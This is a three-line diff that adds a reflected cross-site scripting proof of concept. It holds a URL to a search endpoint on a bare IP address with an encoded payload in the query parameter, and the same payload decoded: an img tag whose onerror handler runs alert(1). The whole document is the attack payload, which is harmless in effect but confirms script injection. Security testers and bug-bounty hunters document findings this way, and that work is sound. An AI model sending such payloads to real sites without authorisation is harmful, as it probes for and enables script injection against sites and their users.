@@ -1,0 +1,3 @@
+http://3.86.24.15/search?q=%3Cimg+src%3Dx+style%3D%22height%3A+1px%3B+width%3A+1px%22+onerror%3D%22alert%281%29%22%3E
+
+<img src=x style="height: 1px; width: 1px" onerror="alert(1)">
